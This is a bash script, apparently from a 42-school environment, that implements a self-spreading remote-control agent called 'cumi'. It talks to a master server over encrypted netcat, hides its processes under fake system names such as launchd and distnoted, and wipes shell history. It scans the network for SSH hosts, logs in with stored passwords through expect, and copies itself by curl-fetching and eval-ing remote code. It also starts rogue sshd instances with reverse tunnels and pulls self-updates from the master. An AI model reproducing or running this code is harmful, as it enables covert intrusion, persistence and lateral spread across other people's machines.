#!/bin/bash
#**************************************************************************#
#                                                                          #
#                                                       :::      ::::::::  #
#  cumi.sh --> if u read this u ar an amazing man :)  :+:      :+:    :+:  #
#                                                   +:+ +:+         +:+    #
#  By: anonymous <anonymous@student.42.fr>        +#+  +:+       +#+       #
#                                               +#+#+#+#+#+   +#+          #
#  Created: 2014/08/10 17:38:53 by anonymous         #+#    #+#            #
#  Updated: 2014/08/10 17:38:55 by anonymous        ###   ########.fr      #
#                                                                          #
#**************************************************************************#

#Net stuff

function send {
	while [ $decstat -eq 1 ]; do sleep 0.5 ; done
	export decstat=1
	scond="`date +"%S"`"
	if [ $scond -ge 56 ]; then sleep $((60 - scond + 4)); fi
	if [ $scond -ge 04 ] && [ $scond -le 02 ]; then sleep $((4 - scond)); fi
	echo "$header$1" | openssl enc -aes-128-cbc -a -salt -pass pass:$(date +"%H%M")$ncport | tr "\n" "\`" | awk '{print $0}' | sed "s/U2FsdGVkX1//g" | nc $master $ncport
	if [ $debug -ge 1 ]; then echo "$header$1"; fi
	export decstat=0
}

function decode {
	while [ $decstat -eq 1 ]; do sleep 0.5 ; done
	export decstat=1
	echo -n "U2FsdGVkX1$1" | tr "\`" "\n" | openssl enc -aes-128-cbc -a -d -salt -pass pass:$(date +"%H%M")$ncport 2>/dev/null
	export decstat=0
}

function print {
	if [ "$1" != "" ] && [ "$debug" -ge 1 ]; then echo "debug[$$]>$1"; fi
}

function killpid {
	if [ -z $1 ]; then
		send "Restart 201"
		kill -9 $pidnc 2>/dev/null
	else
		sleep $(((RANDOM + RANDOM) % 2))
		send "Goodbye 202"
		if [ $1 -eq 2 ]; then
			kill -9 $pidnc 2>/dev/null
			kill -9 $$ 2>/dev/null
		elif [ $1 -eq 1 ] && [ $kl -eq 0 ]; then
			export kl=1
			echo "killme" >/tmp/.infcma
		fi
	fi
}

function nclisten {
	print "connecting to master.."
	print "info $master:$ncport"
	exec -a "/sbin/lounchd `printf %250s`" nc -d $master $ncport | requests &
	sleep 0.5 ; export pidnc="`pgrep -f "/sbin/lounchd"`"
	if kill -0 $pidnc 2>/dev/null;then
		i=0
		send "Hello 200"
	else
		print "Drop 300"
		sleep 0.2
	fi
	trap "killpid 2" INT
}

function chgname {
	if [ "$header" == "cumi>" ]; then echo "header `echo $args | cut -d' ' -f3`" > /tmp/.infcma; fi
	send "reconnect in AUTH mode"
}

function printvar {
	arg3="`echo $args | cut -d' ' -f3`"
	if [ "$arg2" == "$selfname" ] && [ "$arg3" != "" ]; then
		res="`set | grep -ae "^${arg3}=" | head -n1 | cut -d'=' -f2`"
		if [ "$res" != "" ]; then
			send "\$$arg3 = $res"
		else
			send "\$$arg3 empty"
		fi
	fi
}

function setvar {
	arg3="`echo $args | cut -d' ' -f3`"
	arg4="`echo $args | cut -d' ' -f4`"
	if [ "$arg2" == "$selfname" ] && [ "$arg3" != "" ] && [ "$arg4" != "" ]; then
		export $arg3="$arg4"
		send "\$$arg3 = $arg4"
	fi
}

function requests {
	while read -r all; do
		bac="$all"
		all="`decode "$all"`"
		from="`echo $all | cut -d'>' -f1`"
		typ="`echo $from | cut -d'-' -f1 | cut -d':' -f1`"
		name="`echo $from | cut -d':' -f2`"
		args="`echo $all | cut -d'>' -f2`"
		arg1="`echo $args | cut -d' ' -f1`"
		arg2="`echo $args | cut -d' ' -f2`"
		arg3="`echo $args | cut -d' ' -f3`"
		selfname="`echo $header | cut -d'>' -f1 | cut -d'-' -f2`"

		if ! echo "$all" | grep ">" >/dev/null ; then send "bad packet $bac"
		elif [ "$typ" == "console" ] || { [ "$typ" == "joe" ] && [ "$name" == "$selfname" ]; }; then
			case "$arg1" in
				open)giveauth 1;;
				close)giveauth 0;;
				move)giveauth 2;;
				spawn)giveauth 3;;
				ping)send "pong";;
				send)case "$arg2" in
						usedcpt)send "recept list";gencpt;;
						token)send "recept token";export token="$arg3";echo "token $arg3" > /tmp/.infcma;;
					 esac;;
				request)case "$arg2" in
						hostname)send "send hostname `hostname`";;
				esac;;
				autodestroy)if [ "$arg2" == "$arg1" ] || [ "$arg2" == "$selfname" ]; then killpid 1; fi;;
				updateself)echo "mod $arg2" > /tmp/.infcma;;
				pong)export pong=1;;
				"get")printvar;;
				"set")setvar;;
			esac
		elif [ "$header" == "cumi>" ]; then
			case "$arg1" in
				move)giveauth 2;;
				port)send "cumi switch to $args";switch;;
				send)case "$arg2" in
						codename)send "recept codename";chgname;;
					 esac;;
			esac
		fi
	done
}

#Randomize stuff

function gencpt {
	cptlist="`curl -A 'Mozilla/5.0 (Windows NT 6.3; WOW64)' -sL http://$master/musedcpt | tr '@' ' ' | tr '[5-90-4]' '[0-9]' | tr '[g-za-f]' '[a-z]'`"
	dns="`hostname`"
	ip="`ifconfig|grep -v "127"|grep -Eo '(inet |addr:)?([0-9]*\.){3}[0-9]*'|grep 'addr:\|inet '|grep -Eo '([0-9]*\.){3}[0-9]*'`"
	okcpt=0 ; e=0 ; r=0 ; p=0 ; x=0 ; f=0
	while [ $okcpt -ne 1 ];do
		if [ $x -le 15 ];then
			r=$(((RANDOM % 13)+1))
			e=$(((RANDOM % 3)+1))
			if [ $(($r % 2)) -eq 1 ]; then p=$(((RANDOM % 24)+1))
			elif [ $r -eq 1 ] || [ $r -eq 13 ]; then p=$(((RANDOM % 15)+1))
			else p=$(((RANDOM % 22)+1)); fi
			export rdmcpt="e${e}r${r}p${p}.local"
			if [ $x -eq 15 ]; then
				bcast="$(ifconfig|grep -Eo '(broadcast |Bcast:)?([0-9]*\.){3}[0-9]*'|grep 'Bcast\|broadcast '|grep -Eo '([0-9]*\.){3}[0-9]*'|cut -d' ' -f1)"
				if [ "`uname`" != "Darwin" ]; then un="b"; else un="" ;fi
				ping -${un}c 5 "$bcast" 2>/dev/null >&2
				arrcpt=($(arp -a -n | grep -v 'incomplete\|255$' | cut -d'(' -f2 | cut -d')' -f1 | grep -v ".1$\|.255$" | tr '\n' ' '))
				print "found ${#arrcpt} cpt.."
			fi
		else
			rand="$((RANDOM%${#arrcpt}+1))"
			print "$rand - ${arrcpt[$rand]}"
			export rdmcpt="${arrcpt[$rand]}"
		fi
		if echo $cptlist | grep "$rdmcpt" >/dev/null || echo "$rdmcpt" | grep "$ip\|$dns" >/dev/null; then
			print "$rdmcpt used"; okcpt=0;((x++))
		elif ! nc -zw 1 $rdmcpt 22 >/dev/null 2>&1; then print "$rdmcpt offline";((x++))
		else okcpt=1;send "send nextcpt $rdmcpt"; fi
	done
}

#Tunnel stuff

function giveauth {
	unset move endmove
	if [ $1 -eq 0 ]; then
		sshdport="`echo $args | cut -d' ' -f3`"
		user="`echo $args | cut -d' ' -f4`"
		pass="`echo $args | cut -d' ' -f5 | tr '[G-ZA-Fg-za-f]' '[A-Za-z]' | base64 --decode`"
		tmpdir="`echo $args | cut -d' ' -f6`"
		pack="rm -r /var/tmp/$tmpdir;kill -9 \\\`pgrep -U \\\$(id -u) -f $sshdport\\\`;killall -m sshd"
		deploy "$pack" "$arg2" "$sshdport"
		ret=$?
	elif [ $1 -eq 1 ]; then
		ok=0
		remoteport="`echo $args | cut -d' ' -f3`"
		if [ "`echo $args | cut -d' ' -f4`" != "$user" ]; then
			echo "login `echo $args | cut -d' ' -f4` `echo $args | cut -d' ' -f5 | tr '[G-ZA-Fg-za-f]' '[A-Za-z]' | base64 --decode`" > /tmp/.infcma
		fi
		export user="`echo $args | cut -d' ' -f4`"
		export pass="`echo $args | cut -d' ' -f5 | tr '[G-ZA-Fg-za-f]' '[A-Za-z]' | base64 --decode`"
		if nc -w 2 -z $arg2 22 >/dev/null 2>&1 && ! nc -w 2 -z $arg2 $remoteport >/dev/null 2>&1; then
			ok=0;while [ $ok -ne 1 ]; do sshdport=$((RANDOM%63000+2001)); ! nc -w 2 -z $arg2 $sshdport >/dev/null 2>&1 && ok=1; done
			tmpdir="/var/tmp/`cat /dev/urandom | LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n1`"
			rsa="`cat /dev/urandom | LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n1`"
			conf="Port $sshdport\\\nProtocol 2\\\nAddressFamily inet\\\nHostKey $tmpdir/$rsa\\\nLoginGraceTime 3\\\nPasswordAuthentication yes\\\nChallengeResponseAuthentication no\\\nPrintMotd no\\\nPrintLastLog no\\\nTCPKeepAlive yes\\\nUsePAM yes\\\nUseDns no"
			pack="mkdir $tmpdir && cd $tmpdir && ssh-keygen -t rsa -P '' -f $rsa < <(echo y) && rm $rsa.pub && echo -e '$conf' > cfg && \\\`type -a sshd | rev | cut -d' ' -f1 | rev\\\` -f cfg && rm cfg && cp \\\`type -a ssh | rev | cut -d' ' -f1 | rev\\\` launchd && bash -c \\\"exec -a '/usr/sbin/distnoted agent\`printf "%1000s"\`' ./launchd -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oPasswordAuthentication=yes -oCheckHostIP=no -fNR $remoteport:localhost:$sshdport -p 8081 eoj@$master\\\" && rm launchd && echo OK && true"
			deploy "$pack" "$arg2"
			ret=$?
		elif ! nc -w 2 -z $arg2 22 >/dev/null 2>&1; then ret=1
		elif nc -w 2 -z $arg2 $remoteport >/dev/null 2>&1; then ret=4
		else ret=5
		fi
	elif [ $1 -eq 3 ]; then
		send "spawn $arg2 to $arg3"
		move="send \"bash\r\"
		expect \"\*bash\"
		send \"unset HISTFILE\rexec -a '/usr/sbin/distnoted agent' bash\r\"
		expect \"\*distnoted\""
		vars="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;export LC_CTYPE=C;export LANG=C;aastart=0;zzend=0;decstat=0;getpong=0;pendingtok=0;pendingping=0;killar=0;jump=1;i=0;x=0;ok=0;user=$user;pass=$pass;header=\'$arg2>\';$(set|awk '/aastart/,/zzend/'|grep 'user\|pass\|master\|engage\|ncport\|debug\\|pendingn'|grep -v vars|tr '\n' ';'|rev|cut -c2-|rev)"
		pack="unset HISTFILE\reval \\\"$vars\\\" && eval \\\"\\\$(curl -A 'Mozilla/5.0 (Windows NT 6.3; WOW64)' -sL http://joe.domain.com/$token|sed -n '/function/,/^\\\\\}\\\$/p')\\\" && main >> /tmp/ret & exit && true"
		deploy "$pack" "$arg3"
		ret=$?
	else
		if [ "$rdmcpt" == "" ] && [ "$arg2" != "$arg1" ]; then echo $arg2;else arg2=$rdmcpt; fi
		send "moving to $arg2"
		move="send \"bash\r\"
		expect \"\*bash\"
		send \"unset HISTFILE\rexec -a '/usr/sbin/distnoted agent' bash\r\"
		expect \"\*distnoted\""
		vars="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;export LC_CTYPE=C;export LANG=C;aastart=0;zzend=0;decstat=0;getpong=0;pendingtok=0;pendingping=0;killar=0;jump=1;i=0;x=0;ok=0;user=$user;pass=$pass;$(set|awk '/aastart/,/zzend/' | grep 'user\|pass\|master\|engage\|ncport\|debug\|header\|pendingn'|grep -v vars|tr '\n' ';'|rev|cut -c2-|rev)"
		pack="unset HISTFILE\reval \\\"$vars\\\" && eval \\\"\\\$(curl -A 'Mozilla/5.0 (Windows NT 6.3; WOW64)' -sL http://joe.domain.com/$token|sed -n '/function/,/^\\\\\}\\\$/p')\\\" && main >> /tmp/ret & exit && true"
		endmove="send \"echo OK && true\r\""
		deploy "$pack" "$arg2"
		ret=$?
	fi
	if [ $ret -eq 0 ]; then
		if [ $1 -eq 1 ]; then
			send "send tuninfo $arg2 $remoteport $sshdport `basename $tmpdir`"
		elif [ $1 -eq 0 ]; then
			send "send closeinfo $arg2 $sshdport"
		elif [ $1 -eq 2 ]; then
			getupwemove
		fi
	fi
	case $ret in
		0)send "OK 205 pak is successfully deployed [$arg2]";;
		1)send "ERR 301 could not resolve hostname [$arg2]";;
		2)send "ERR 302 no such file or directory [$arg2]";;
		3)send "ERR 303 permission denied [$arg2]";;
		4)send "ERR 304 port already binded [$arg2]";;
		5)send "ERR 305 unknown error [$arg2]";;
		6)send "ERR 306 unknown curl error [$arg2]";;
		7)send "ERR 307 pid not found [$arg2]";;
	esac
	return $ret
}

function deploy {
	if [ "$3" == "" ]; then port=22; else port=$3;fi
/usr/bin/expect <<-POUET
	log_user $debug
	set timeout 10
	spawn ssh -t -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oCheckHostIP=no -p $port $user@$2
	expect "ssword"
	send "$pass\r"
	expect {
		"oh-my-zsh" {send "y\r";exp_continue}
		"ssword" {exit 3}
		timeout {exit 5}
		% {
			send "unset HISTFILE && PS1=prompt\rsed -i '' '\$ d' .zsh_history 2>/dev/null\r"
			expect "*prompt" {
				$move
				send "$1\r"
				$endmove
				expect {
					"OK\r" {exit 0}
					"*\rprompt" {exit 0}
					"Name or service not known" {exit 1}
					"chdir to home" {exp_continue}
					"No such file" {exit 2}
					"Permission denied" {exit 3}
					"bind" {exit 4}
					timeout {exit 5}
					"curl: (6)" {exit 6}
					"not enough arguments" {exit 7}
				}
			}
		}
	}
POUET
	return $?
}

#Escape stuff

function getupwemove {
	echo -e '\033[0;33m                                 .z/||/.\n              ./d|||///..      .|||||||P""\n           /|||||||||||||||||//||||||"\n        ./|||||||||||||||||||||||||"\n      .||||||||||||||||||||||||||||||/..\n    .||****""""***|||||||||||||||||||||||||||b/.\n                     ""**D||||||||||||||||||||||L\n                       /|||||||||||||||||||||||||\n                     .||||||||P**||||||||||||||||\n                    /|||||||"              4|||||\n                  /|||||||||                |||/\n                 /|||||||||F                |/\n                 ||||||||||F \033[0mCumi was here..\033[0;33m\n                  *||||||||"\n                    "***""\033[0m' > /tmp/raadm
	kill -9 $pidnc 2>/dev/null
	kill -9 $$ 2>/dev/null
}

function main {
	if [[ -z $header ]]; then declare header="cumi>" ; fi
	while [ $engage -eq 1 ]; do
		#connectivity
		if ! kill -0 $pidnc 2>/dev/null; then ok=1;ncport=`curl -A 'Mozilla/5.0 (Windows NT 6.3; WOW64)' -sL http://$master/port/ | tr '[7-90-6]' '[0-9]'` ; ((i++)); nclisten
		elif [ $ok -ne 0 ]; then ok=0; fi
		if [ $i -eq 10 ];then echo "Dead"; killpid 2;engage=0; fi
		#header
		if [ $ok -eq 0 ]; then
			if [ `date +"%S"` -eq 07 ]; then sleep $(((RANDOM + RANDOM) % 2)); send "KeepAlive";fi
			if [ $jump -eq 1 ] && [ "$header" != "cumi>" ]; then send "jumped `date +"%H:%M"` `hostname` $$";jump=0; fi
			if [ "$header" == "cumi>" ] && [ $pendingn -le 2 ];then
				if [ $pendingn -eq 0 ];then send "send hostname `hostname`" ; send "request codename"; pendingn=1
				elif [ $pendingn -eq 1 ] ; then
					if [ "$header" != "cumi>" ]; then pendingn=3; fi
					((x++))
					if [ $x -gt 7 ] && [ $pendingping -ne 1 ]; then
						send "ping";pendingping=1
					elif [ $x -gt 14 ]; then
						if [ $getpong -eq 1 ]; then
							pendingping=0;getpong=0;pendingn=0;x=0
						else
							send "Joe down retry in 60s"
							pendingping=0;getpong=0;pendingn=2;x=60
							if [ "$cptlist" == "" ]; then gencpt;cptlist="ok"; fi
						fi
					fi
				fi
				if [ $pendingn -eq 2 ]; then if [ $x -ne 0 ]; then ((x--)); else pendingn=0 ;fi
			fi
		fi
			#token
			if [ "$header" != "cumi>" ] && [ $ok -eq 0 ] && [ "$cptlist" == "" ];then gencpt;cptlist="ok"; fi
			if [ "$header" != "cumi>" ] && [ "$token" == "" ] && [ $pendingtok -eq 0 ]; then send "request token"; pendingtok=1; d=10
			elif [ "$token" != "" ] && [ $pendingtok -eq 1 ]; then pendingtok=2
			elif [ "$header" != "cumi>" ] && [ $pendingtok -eq 1 ]; then if [ $d -ne 0 ]; then ((d--)) ; else pendingtok=2 ; fi; fi
		fi
		#resurface
		if [ -f /tmp/.infcma ]; then
			infcma="$(cat /tmp/.infcma)"
			if echo $infcma | grep "header" >/dev/null; then
				header="cumi-`echo $infcma | cut -d' ' -f2`>"
				rm /tmp/.infcma; killpid
			elif echo $infcma | grep "killme" >/dev/null; then
				engage=0
				rm /tmp/.infcma
			elif echo $infcma | grep "login" >/dev/null; then
				export user="$(echo $infcma | cut -d' ' -f2)"
				export pass="$(echo $infcma | cut -d' ' -f3)"
				rm /tmp/.infcma
			elif echo $infcma | grep "token" >/dev/null; then
				token="`echo $infcma | cut -d' ' -f2`"
				rm /tmp/.infcma
			elif echo $infcma | grep "pong" >/dev/null; then
				if [ $pendingping -eq 1 ]; then getpong=1; fi
				rm /tmp/.infcma
			elif echo $infcma | grep "mod" >/dev/null; then
				pak="`curl -A 'Mozilla/5.0 (Windows NT 6.3; WOW64)' -sL http://$master/$(echo $infcma | cut -d' ' -f2) | sed -n '/function/,/^}$/p'`"
				rm /tmp/.infcma
				if [ -f /sbin/md5 ]; then curmd5="`echo $pak | md5`"; else curmd5="`echo $pak | md5sum`"; fi
				if [ "$md5mod" == "" ] || [ "$md5mod" != "$curmd5" ]; then
					if eval "$pak" 2>&1 >/dev/null; then
						export md5mod=$curmd5
						killpid
					else
						send "update failed check the code !"
					fi
				else
					send "up-to-date"
				fi
			else
				rm /tmp/.infcma
			fi
		fi

		if [ $pendingmv -ne 1 ] && ps aux | grep -v grep | grep "\-zsh\|sshd\|Dock" | grep -v $USER >/dev/null || [ $pendingmv -ne 1 ] && w -h | grep -v $USER >/dev/null; then giveauth 2;pendingmv=0;gencpt; fi
		sleep 1
	done > /tmp/out
}

#cumi start here
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export LC_CTYPE=C
export LANG=C
aastart=0;i=0;kl=0;x=0;ok=0;pendingtok=0;getpong=0;engage=1;pendingn=0;pendingmv=0;pendingping=0;decstat=0;pong=0;zzend=0;jump=0

debug=1
master="joe.domain.com"
user="nsaintot"
pass="password"
ncport=2945

main
